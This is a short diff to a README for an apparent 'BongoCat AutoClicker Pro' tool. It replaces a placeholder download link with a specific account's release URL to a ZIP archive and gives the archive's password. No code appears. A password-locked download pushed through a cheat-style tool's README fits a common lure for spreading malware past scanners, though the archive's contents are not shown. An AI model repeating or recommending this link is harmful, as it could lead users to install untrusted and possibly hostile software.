@@ -4,7 +4,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/BongoCat-AutoClicker-Pro/releases/latest/download/BongoCat-AutoClicker.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Eamonelleryl/BongoCat-AutoClicker-Pro/releases/download/download/BongoCat_AutoClicker.zip)
 
 🔐 Archive password: `5868781`
 
